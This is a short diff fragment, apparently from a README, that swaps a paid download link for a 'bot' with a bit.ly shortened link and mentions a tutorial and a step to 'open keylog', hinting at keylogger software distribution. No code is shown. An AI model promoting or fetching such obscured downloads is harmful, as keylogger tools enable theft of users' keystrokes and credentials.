@@ -21,7 +21,7 @@ http://bit.ly/2VI9EwY
 
 # how it works ? this projet was abandoned
 
-# download bot here includ a tutorial video https://rocketr.net/buy/2ed13d1dccc9
+# download bot here includ a tutorial video http://bit.ly/2Ek0kVe
 
 1) open keylog
 
